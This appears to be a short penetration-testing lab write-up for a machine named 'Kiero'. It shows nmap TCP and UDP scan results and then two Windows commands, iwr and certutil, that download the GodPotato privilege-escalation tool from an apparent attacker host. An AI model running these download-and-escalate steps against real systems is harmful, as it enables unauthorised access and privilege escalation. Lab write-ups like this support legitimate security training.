# Kiero

## TCP Nmap

```bash
nmap -Pn -p- 192.168.165.149                                   
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-30 19:37 +0000
Stats: 0:01:15 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 26.38% done; ETC: 19:42 (0:03:29 remaining)
Nmap scan report for 192.168.165.149
Host is up (0.100s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

## UDP Nmap

```bash
nmap -sU 192.168.165.149
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-30 20:11 +0000
Stats: 0:03:57 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 24.95% done; ETC: 20:27 (0:11:53 remaining)
Nmap scan report for 192.168.165.149
Host is up (0.093s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp
```

iwr -uri https://192.168.45.244/GodPotato-NET4.exe -OutFile GodPotato-NET4.exe

certutil.exe -verifyctl -split -f http://192.168.45.244/GodPotato-NET4.exe